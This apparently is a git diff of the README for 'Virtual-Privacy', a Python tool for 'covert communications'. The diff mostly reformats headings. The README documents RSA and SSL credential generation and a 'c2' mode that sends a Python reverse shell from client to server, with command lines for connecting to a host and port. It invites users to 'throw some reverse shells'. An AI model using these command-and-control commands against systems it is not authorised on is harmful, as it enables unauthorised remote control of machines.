@@ -8,6 +8,8 @@ It should be noted, that although the Chatroom operations are styled after AOL c
 
 You will find a comprehensive manual that will teach you how to use all of the easy features that the program offers to conduct covert communications!
 
+---
+
 ## Index:
 
 1) [Installation](#installation)
@@ -17,10 +19,13 @@ You will find a comprehensive manual that will teach you how to use all of the e
 5) [Host Operations](#host_operations)
 6) [Encryption & Decryption](#encryption_&_decryption_options)
 
+---
 
 ## Installation
 
-VP uses one non-standard Python library, `pycryptodome`. VP also requires OpenSSL.
+VP uses one non-standard Python library, `pycryptodome`. 
+
+VP also requires OpenSSL.
 
 **To install Virtual-Privacy:**
 
@@ -46,6 +51,7 @@ pip install pycryptodome
 
 4) Generate some credentials, throw some reverse shells, and have fun!
 
+---
 
 ## VP Encryption Options
 
@@ -54,7 +60,9 @@ pip install pycryptodome
 3) [VPP](#vpp)
 4) [SSL & VPP](#vpp_&_ssl)
 
-### Base64
+---
+
+## Base64
 
 By default all communications are encoded with Base64. Although this 
 doesn't provide confidentially, integrity, or authenticity, it provides a 
@@ -94,8 +102,9 @@ python vp.py --server c2 --private-key ./path/privkey.pem --certificate .
 python vp.py -c c2 -crt ./path/cert.crt -ip www.bobcats.com -p 1337
 ```
 
+---
 
-### VPP
+## VPP
 
 The Virtual Privacy Protocol provides authenticity, confidentiality, and 
 integrity. It utilizes a hybrid encryption model, and additionally 
@@ -124,6 +133,7 @@ python vp.py --client c2 --host 192.168.2.15 --port 1337 --private-key ./key.
 pem 
 ```
 
+---
 
 ## **Generate Credentials**
 
@@ -144,15 +154,18 @@ options are wrappers for OpenSSL, which allow VP users to credentials for
 SSL on the fly, or establish more in depth PKI, including a root 
 Certificate Authority. 
 
-#### Credential Operations:
+---
+
+## **Credential Operations:**
 
 1) [rsa](#rsa)
 2) [self-sign](#self-sign)
 3) [fast-gen](#fast-gen)
 4) [root-ca](#root-ca)
 
+---
 
-#### **rsa**
+### **rsa**
 
 This function allows the user to generate a new RSA keypair, with optional 
 password encryption. 
@@ -175,8 +188,9 @@ python vp.py -pki rsa
 python vp.py -pki rsa --private-key ./export/path/privkey.pem --public-key  
 ```
 
+---
 
-#### **self-sign**
+### **self-sign**
 
 This operation takes a preexisting RSA private key and uses it to produce a 
 self-signed x509 certificate for establishing SSL. 
@@ -201,8 +215,9 @@ python vp.py -pki ss -pr ./path/privkey.pem
 python vp.py -pki ss -pr /path/privkey.pem --certificate ./my_certificate.crt
 ```
 
+---
 
-#### **fast-gen**
+### **fast-gen**
 
 This operation instantly spits out the necessary credentials for 
 establishing a SSL encrypted connection, a new RSA private key and signed 
@@ -224,8 +239,9 @@ python vp.py -pki fg
 
 ```
 
+---
 
-#### **root-ca**
+### **root-ca**
 
 The `root-ca` operation allows users to interactively generate public 
 key infrastructure. The output from this operation includes creating a root 
@@ -242,6 +258,8 @@ python vp.py --generate-pki root-ca
 python vp.py -pki ca
 ```
 
+---
+
 ## **Client & Server Operations**
 
 Both client and server operating modes feature 12 variations on 3 host 
@@ -257,7 +275,9 @@ runtime. For more information on VP's encryption options, see:
 2) [ftp](#ftp)
 3) [chat](#chat)
 
-#### **c2**
+---
+
+### **c2**
 
 VP's Command & Control mode sends a Pythonic reverse shell from the client 
 to the server. The client runs the shell in a subprocess and 
